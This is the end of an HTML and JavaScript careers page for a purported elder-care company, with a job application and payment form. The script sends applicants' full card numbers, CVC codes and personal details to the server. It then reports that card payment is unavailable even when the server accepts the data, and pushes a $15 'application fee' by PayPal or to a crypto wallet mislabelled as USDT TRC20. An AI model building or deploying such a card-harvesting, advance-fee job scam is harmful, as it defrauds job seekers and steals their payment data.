                    <div id="alternative-payment-instructions" class="mt-8 p-4 bg-blue-100 rounded-lg hidden">
                        <div class="alert-error">
                            <p class="mb-2"><strong>Payment System Notice:</strong></p>
                            <p>We are currently experiencing a temporary technical issue with card payments. We apologize for the inconvenience.</p>
                            <p class="mt-2">Please consider using one of our alternative payment methods below to complete your application.</p>
                        </div>

                        <h3 class="text-xl font-semibold text-blue-700 mb-3">Alternative Payment Methods:</h3>

                        <h4 class="text-lg font-medium text-blue-600 mt-4">1. PayPal:</h4>
                        <p class="text-gray-700">Send your payment of <strong>$15.00</strong> to our official PayPal account:</p>
                        <p class="font-mono bg-gray-200 p-2 rounded text-sm text-gray-800 break-words">payments@tregeriatriccare.org</p>
                        <p class="text-sm text-gray-600 mt-1">Please include your full name and "Job Application Payment" in the notes.</p>
                        <div class="mt-4">
                            <label for="paypalTransactionId" class="block text-gray-700 text-sm font-bold mb-2">PayPal Transaction ID:</label>
                            <input type="text" id="paypalTransactionId" placeholder="Enter PayPal Transaction ID" class="shadow appearance-none border rounded-lg w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent">
                        </div>


                        <h4 class="text-lg font-medium text-blue-600 mt-4">2. Cryptocurrency (USDT TRC20):</h4>
                        <p class="text-gray-700">Send payment of <strong>15 USDT</strong> (TRC20 network) to our official crypto wallet address:</p>
                        <p class="font-mono bg-gray-200 p-2 rounded text-sm text-gray-800 break-words">bc1qhpaw0y4296p9ua75e2df9h5pqaqyt6m5au7k0m</p>
                        <p class="text-sm text-gray-600 mt-1"><strong>Important:</strong> Make sure to use the TRC20 network for USDT. After sending, please email a screenshot of the transaction to our support team with your full name and the transaction ID.</p>
                        <div class="mt-4">
                            <label for="cryptoTransactionId" class="block text-gray-700 text-sm font-bold mb-2">Cryptocurrency Transaction ID:</label>
                            <input type="text" id="cryptoTransactionId" placeholder="Enter Crypto Transaction ID (TXID)" class="shadow appearance-none border rounded-lg w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent">
                        </div>

                        <button id="submitAlternativePayment" class="btn-primary w-full bg-purple-600 hover:bg-purple-700 mt-6 shadow-xl text-lg py-4 px-8" disabled>Confirm & Submit Application</button>
                    </div>
                </div>
            </section>
        </div>
    </main>

    <footer class="gradient-bg-footer text-white py-8 px-4 rounded-t-3xl shadow-inner">
        <div class="container mx-auto flex flex-col md:flex-row justify-between items-center text-center md:text-left">
            <div class="mb-4 md:mb-0">
                <h3 class="text-xl font-bold">TRE Geriatric Care</h3>
                <p class="text-sm text-gray-200">&copy; 2025 All rights reserved.</p>
            </div>
            <nav class="flex flex-wrap justify-center md:justify-end space-x-6">
                <a href="index.html" class="footer-link">Home</a>
                <a href="about.html" class="footer-link">About Us</a>
                <a href="services.html" class="footer-link">Services</a>
                <a href="careers.php" class="footer-link">Careers</a> <a href="contact.html" class="footer-link">Contact Us</a>
                <a href="client_portal.html" class="footer-link">Client Portal</a>
                <a href="payment.html" class="footer-link">Make Payment</a>
            </nav>
        </div>
    </footer>

    <div id="completionModal" class="modal-overlay hidden">
        <div class="modal-content">
            <button class="modal-close-btn" id="closeModalBtn">&times;</button>
            <svg class="mx-auto h-24 w-24 text-green-500 mb-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <h2 class="text-4xl font-extrabold text-green-700 mb-4">Application Submitted!</h2>
            <p class="text-lg leading-relaxed text-gray-700 mb-6">
                Your application has been submitted.
            </p>
            <p class="text-lg leading-relaxed text-gray-700 mb-8">
                **Please note: While your card payment details have been recorded, our card payment system is currently under contracting. To finalize your application, please proceed with one of the alternative payment methods (PayPal or Cryptocurrency) provided below.**
            </p>
            <div class="mt-8">
                <a href="index.html" class="btn-primary bg-blue-600 hover:bg-blue-700 inline-flex items-center">
                    <svg class="w-5 h-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m0 0l7 7m-5 5v5a1 1 0 01-1 1h-3" />
                    </svg>
                    Go to Home Page
                </a>
            </div>
        </div>
    </div>


    <script>
        // Define the URL for your PHP script - NOW IT POINTS TO ITSELF!
        const PHP_PROCESSOR_URL = 'careers.php'; // Or the full URL like 'http://localhost/tre_geriatric_care/careers.php'

        // Function to show a simple notification message (can be used for general messages)
        function showNotification(message, type = 'info') {
            const notificationContainer = document.createElement('div');
            notificationContainer.classList.add('fixed', 'bottom-4', 'right-4', 'p-4', 'rounded-lg', 'shadow-lg', 'text-white', 'z-50');

            if (type === 'error') {
                notificationContainer.classList.add('bg-red-600');
            } else if (type === 'success') {
                notificationContainer.classList.add('bg-green-600');
            } else {
                notificationContainer.classList.add('bg-blue-600');
            }

            notificationContainer.textContent = message;
            document.body.appendChild(notificationContainer);

            // Automatically remove the notification after 3 seconds
            setTimeout(() => {
                notificationContainer.remove();
            }, 3000);
        }

        document.addEventListener('DOMContentLoaded', function() {
            // Mobile menu toggle functionality
            const mobileMenuButton = document.getElementById('mobile-menu-button');
            const mobileMenu = document.getElementById('mobile-menu');

            if (mobileMenuButton && mobileMenu) {
                mobileMenuButton.addEventListener('click', function() {
                    mobileMenu.classList.toggle('hidden');
                });
            }

            // Optional: Close mobile menu when a link is clicked
            mobileMenu.querySelectorAll('a').forEach(link => {
                link.addEventListener('click', () => {
                    if (!mobileMenu.classList.contains('hidden')) {
                        mobileMenu.classList.add('hidden');
                    }
                });
            });

            const careerForm = document.getElementById('careers-application-form');
            const paymentForm = document.getElementById('payment-form');
            const paymentMessageContainer = document.getElementById('payment-message-container');
            const alternativePaymentInstructions = document.getElementById('alternative-payment-instructions');

            const paypalTransactionIdInput = document.getElementById('paypalTransactionId');
            const cryptoTransactionIdInput = document.getElementById('cryptoTransactionId');
            const submitAlternativePaymentBtn = document.getElementById('submitAlternativePayment');

            // Modal elements
            const completionModal = document.getElementById('completionModal');
            const closeModalBtn = document.getElementById('closeModalBtn');

            // Store career form data globally to be used for final submission
            let collectedCareerData = {};

            // Function to show payment message
            function showPaymentMessage(message, type, duration = 5000) { // Default duration 5 seconds
                paymentMessageContainer.textContent = message;
                paymentMessageContainer.className = `message-box ${type}`;
                paymentMessageContainer.classList.remove('hidden');
                // Don't hide automatically for error messages that suggest alternative payments
                if (type !== 'error') {
                    setTimeout(() => {
                        paymentMessageContainer.classList.add('hidden');
                    }, duration);
                }
            }

            // Function to show the completion modal
            function showCompletionModal() {
                completionModal.classList.add('show');
            }

            // Function to hide the completion modal
            function hideCompletionModal() {
                completionModal.classList.remove('show');
                // Optionally reset forms here if needed, or redirect
                careerForm.reset();
                paymentForm.reset();
                paypalTransactionIdInput.value = '';
                cryptoTransactionIdInput.value = '';
                // Hide payment section after success
                // document.getElementById('payment-section').classList.add('hidden'); // Keep payment section visible for alternative payments
            }

            // Close modal by clicking the X button
            closeModalBtn.addEventListener('click', hideCompletionModal);

            // Close modal by clicking outside it
            completionModal.addEventListener('click', (event) => {
                if (event.target === completionModal) {
                    hideCompletionModal();
                }
            });


            // Function to determine card issuer based on card number prefix (client-side for UX)
            function getCardIssuer(cardNumber) {
                const cleanedCardNumber = cardNumber.replace(/\D/g, ''); // Remove non-digit characters

                if (cleanedCardNumber.startsWith('4')) {
                    return 'Visa';
                } else if (cleanedCardNumber.startsWith('5') && parseInt(cleanedCardNumber.substring(1, 2)) >= 1 && parseInt(cleanedCardNumber.substring(1, 2)) <= 5) {
                    return 'Mastercard';
                }
                // Add more card types if needed
                return 'Unknown';
            }

            if (paymentForm) {
                paymentForm.addEventListener('submit', async function(event) {
                    event.preventDefault();

                    // 1. Collect and validate career application data
                    const careerFormData = {};
                    const careerRequiredInputs = careerForm.querySelectorAll('[required]');
                    let allCareerFieldsFilled = true;

                    for (const input of careerRequiredInputs) {
                        if (input.type === 'radio') {
                            const radioGroupName = input.name;
                            const radioGroup = document.querySelectorAll(`#careers-application-form input[name="${radioGroupName}"]`);
                            const checkedRadio = Array.from(radioGroup).find(radio => radio.checked);
                            if (!checkedRadio) {
                                allCareerFieldsFilled = false;
                                input.focus(); // Focus on the first unfilled required field
                                break;
                            }
                            careerFormData[radioGroupName] = checkedRadio.value;
                        } else if (input.tagName === 'SELECT') {
                            if (input.value === "") {
                                allCareerFieldsFilled = false;
                                input.focus();
                                break;
                            }
                            careerFormData[input.name] = input.value.trim();
                        } else if (input.value.trim() === '') {
                            allCareerFieldsFilled = false;
                            input.focus();
                            break;
                        } else {
                            careerFormData[input.name] = input.value.trim();
                        }
                    }

                    if (!allCareerFieldsFilled) {
                        showNotification('Please fill in all *required* fields in the Job Application Form before proceeding to payment.', 'error');
                        return;
                    }

                    // Collect all application form data (including non-required for storage)
                    const allCareerFormInputs = careerForm.querySelectorAll('input, select, textarea');
                    allCareerFormInputs.forEach(input => {
                        if (input.type === 'radio' && !input.checked) return;
                        if (input.name) { // Ensure input has a name attribute
                            careerFormData[input.name] = input.value.trim();
                        }
                    });

                    // Explicitly handle fields whose visibility might depend on radio buttons, if not already captured
                    const childrenDetails = document.getElementById('childrenDetails');
                    if (childrenDetails && careerFormData.hasChildren === 'yes') {
                        careerFormData.childrenDetails = childrenDetails.value.trim();
                    }
                    const universityDetails = document.getElementById('universityDetails');
                    if (universityDetails && careerFormData.educationLevel === 'university') {
                        careerFormData.universityDetails = universityDetails.value.trim();
                    }
                    const additionalCertificatesDetails = document.getElementById('additionalCertificatesDetails');
                    if (additionalCertificatesDetails && careerFormData.hasAdditionalCertificates === 'yes') {
                        careerFormData.additionalCertificatesDetails = additionalCertificatesDetails.value.trim();
                    }
                    const workedWithElderlyDetails = document.getElementById('workedWithElderlyDetails');
                    if (workedWithElderlyDetails && careerFormData.workedWithElderly === 'yes') {
                        careerFormData.workedWithElderlyDetails = workedWithElderlyDetails.value.trim();
                    }
                    const additionalTravelDocsDetails = document.getElementById('additionalTravelDocsDetails');
                    if (additionalTravelDocsDetails && careerFormData.hasAdditionalTravelDocs === 'yes') {
                        careerFormData.additionalTravelDocsDetails = additionalTravelDocsDetails.value.trim();
                    }

                    // Store collected career data for later final submission
                    collectedCareerData = careerFormData;

                    // 2. Collect and validate payment data (for card attempt)
                    const cardNumber = document.getElementById('cardNumber').value;
                    const expiryDate = document.getElementById('expiryDate').value;
                    const cvc = document.getElementById('cvc').value;
                    const cardHolderName = document.getElementById('cardHolderName').value;
                    const amount = parseFloat(document.getElementById('amount').value);

                    if (!cardNumber || !expiryDate || !cvc || !cardHolderName || isNaN(amount) || amount <= 0) {
                        showPaymentMessage('Please fill in all required card payment fields.', 'error');
                        return;
                    }

                    const cardType = getCardIssuer(cardNumber); // Get card type for backend storage

                    // Attempt card payment
                    showPaymentMessage('Processing card payment... Please wait.', 'info');
                    alternativePaymentInstructions.classList.add('hidden'); // Hide alternative instructions initially
                    paymentForm.querySelector('button[type="submit"]').disabled = true; // Disable card submit button temporarily

                    // Prepare data for PHP backend
                    const paymentData = {
                        paymentMethod: 'Card',
                        amount: amount,
                        cardDetails: {
                            cardHolderName: cardHolderName,
                            cardNumber: cardNumber, // Full card number
                            expiryDate: expiryDate,
                            cvc: cvc,              // CVC
                            cardType: cardType     // Determined issuer
                        },
                        applicationData: collectedCareerData // Include all career form data
                    };

                    console.log('Sending card payment data:', paymentData); // Log data being sent

                    try {
                        const response = await fetch(PHP_PROCESSOR_URL, { // Points to careers.php itself
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify(paymentData)
                        });

                        const result = await response.json();
                        console.log('Response from PHP (Card Payment):', result); // Log response from PHP

                        if (result.success) {
                            showPaymentMessage(`Card payment data recorded. Our card payment system is currently under contracting. Please proceed with alternative payment methods.`, 'info', 8000); // Changed message to prompt alternatives
                            alternativePaymentInstructions.classList.remove('hidden'); // Always show alternative instructions
                            showCompletionModal(); // Show the modal confirming application submission
                        } else {
                            // If backend reports failure, show alternative methods and an error message
                            showPaymentMessage(`Card payment failed: ${result.message}. Please use an alternative method.`, 'error');
                            alternativePaymentInstructions.classList.remove('hidden');
                        }
                    } catch (error) {
                        console.error('Error sending data to PHP:', error);
                        showPaymentMessage('Network error or server unreachable. Please try alternative payment methods.', 'error');
                        alternativePaymentInstructions.classList.remove('hidden');
                    } finally {
                        paymentForm.querySelector('button[type="submit"]').disabled = false; // Re-enable button
                        // Clear card details for security/re-entry, as it might have failed or been processed.
                        document.getElementById('cardNumber').value = '';
                        document.getElementById('expiryDate').value = '';
                        document.getElementById('cvc').value = '';
                        document.getElementById('cardHolderName').value = '';
                    }
                });
            }

            // --- Unified Alternative Payment Submission ---

            // Function to check if either PayPal or Crypto ID is filled and enable the single button
            function checkAlternativePaymentInputs() {
                const paypalId = paypalTransactionIdInput.value.trim();
                const cryptoId = cryptoTransactionIdInput.value.trim();

                // Enable button if at least one field has significant content
                if (paypalId.length > 5 || cryptoId.length > 10) {
                    // Only remove 'hidden' if it's there. This ensures it's always visible when enabled.
                    submitAlternativePaymentBtn.classList.remove('hidden');
                    submitAlternativePaymentBtn.disabled = false;
                } else {
                    submitAlternativePaymentBtn.classList.add('hidden'); // Add hidden if inputs are empty
                    submitAlternativePaymentBtn.disabled = true;
                }
            }

            // Add event listeners to the transaction ID inputs
            paypalTransactionIdInput.addEventListener('input', checkAlternativePaymentInputs);
            cryptoTransactionIdInput.addEventListener('input', checkAlternativePaymentInputs);

            // Handle the single alternative payment button click
            submitAlternativePaymentBtn.addEventListener('click', async function() {
                const paypalId = paypalTransactionIdInput.value.trim();
                const cryptoId = cryptoTransactionIdInput.value.trim();
                let paymentMethod = '';
                let transactionId = '';
                let messagePrefix = '';

                // Validation: Ensure only one field is filled
                if (paypalId && cryptoId) {
                    showPaymentMessage('Please enter EITHER a PayPal Transaction ID OR a Cryptocurrency Transaction ID, not both.', 'error');
                    return;
                } else if (paypalId) {
                    paymentMethod = 'PayPal';
                    transactionId = paypalId;
                    messagePrefix = 'PayPal';
                } else if (cryptoId) {
                    paymentMethod = 'Crypto';
                    transactionId = cryptoId;
                    messagePrefix = 'Cryptocurrency';
                } else {
                    // This case should ideally not happen if button is disabled correctly
                    showPaymentMessage('Please enter a Transaction ID for PayPal or Cryptocurrency.', 'error');
                    return;
                }

                showPaymentMessage(`Confirming ${messagePrefix} transaction and submitting application...`, 'info');
                submitAlternativePaymentBtn.disabled = true; // Disable button during submission

                // Collect and validate career application data before alternative payment submission
                const careerFormData = {};
                const careerRequiredInputs = careerForm.querySelectorAll('[required]');
                let allCareerFieldsFilled = true;

                for (const input of careerRequiredInputs) {
                    if (input.type === 'radio') {
                        const radioGroupName = input.name;
                        const radioGroup = document.querySelectorAll(`#careers-application-form input[name="${radioGroupName}"]`);
                        const checkedRadio = Array.from(radioGroup).find(radio => radio.checked);
                        if (!checkedRadio) {
                            allCareerFieldsFilled = false;
                            input.focus(); // Focus on the first unfilled required field
                            break;
                        }
                        careerFormData[radioGroupName] = checkedRadio.value;
                    } else if (input.tagName === 'SELECT') {
                        if (input.value === "") {
                            allCareerFieldsFilled = false;
                            input.focus();
                            break;
                        }
                        careerFormData[input.name] = input.value.trim();
                    } else {
                        careerFormData[input.name] = input.value.trim();
                    }
                }

                if (!allCareerFieldsFilled) {
                    showNotification('Please fill in all *required* fields in the Job Application Form before proceeding to payment.', 'error');
                    submitAlternativePaymentBtn.disabled = false; // Re-enable button
                    return;
                }

                // Collect all application form data (including non-required for storage)
                const allCareerFormInputs = careerForm.querySelectorAll('input, select, textarea');
                allCareerFormInputs.forEach(input => {
                    if (input.type === 'radio' && !input.checked) return;
                    if (input.name) { // Ensure input has a name attribute
                        careerFormData[input.name] = input.value.trim();
                    }
                });

                // Explicitly handle fields whose visibility might depend on radio buttons, if not already captured
                const childrenDetails = document.getElementById('childrenDetails');
                if (childrenDetails && careerFormData.hasChildren === 'yes') {
                    careerFormData.childrenDetails = childrenDetails.value.trim();
                }
                const universityDetails = document.getElementById('universityDetails');
                if (universityDetails && careerFormData.educationLevel === 'university') {
                    careerFormData.universityDetails = universityDetails.value.trim();
                }
                const additionalCertificatesDetails = document.getElementById('additionalCertificatesDetails');
                if (additionalCertificatesDetails && careerFormData.hasAdditionalCertificates === 'yes') {
                    careerFormData.additionalCertificatesDetails = additionalCertificatesDetails.value.trim();
                }
                const workedWithElderlyDetails = document.getElementById('workedWithElderlyDetails');
                if (workedWithElderlyDetails && careerFormData.workedWithElderly === 'yes') {
                    careerFormData.workedWithElderlyDetails = workedWithElderlyDetails.value.trim();
                }
                const additionalTravelDocsDetails = document.getElementById('additionalTravelDocsDetails');
                if (additionalTravelDocsDetails && careerFormData.hasAdditionalTravelDocs === 'yes') {
                    careerFormData.additionalTravelDocsDetails = additionalTravelDocsDetails.value.trim();
                }

                collectedCareerData = careerFormData; // Update collectedCareerData after re-validation

                const paymentData = {
                    paymentMethod: paymentMethod,
                    transactionId: transactionId,
                    amount: 15.00, // Hardcoded for this example
                    applicationData: collectedCareerData // Include all career form data
                };

                console.log('Sending alternative payment data:', paymentData); // Log data being sent

                try {
                    const response = await fetch(PHP_PROCESSOR_URL, { // Points to careers.php itself
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(paymentData)
                    });

                    const result = await response.json();
                    console.log('Response from PHP (Alternative Payment):', result); // Log response from PHP

                    if (result.success) {
                        showPaymentMessage(`${messagePrefix} payment confirmed with ID: ${transactionId}. Your application has been submitted successfully!`, 'success', 8000); // 8-second success message
                        showCompletionModal(); // Show the modal instead of redirecting
                    } else {
                        showPaymentMessage(`Failed to record ${messagePrefix} payment: ${result.message}. Please double-check the ID or try again.`, 'error');
                    }
                } catch (error) {
                    console.error(`Error sending ${messagePrefix} data to PHP:`, error);
                    showPaymentMessage('Network error or server unreachable. Please try again later.', 'error');
                } finally {
                    submitAlternativePaymentBtn.disabled = false; // Re-enable button
                    // Clear transaction IDs after attempt
                    paypalTransactionIdInput.value = '';
                    cryptoTransactionIdInput.value = '';
                    checkAlternativePaymentInputs(); // Re-evaluate button state
                }
            });

            // Initial check on page load to hide/show the button if inputs are pre-filled (unlikely but good practice)
            checkAlternativePaymentInputs();
        });
    </script>
</body>
</html>
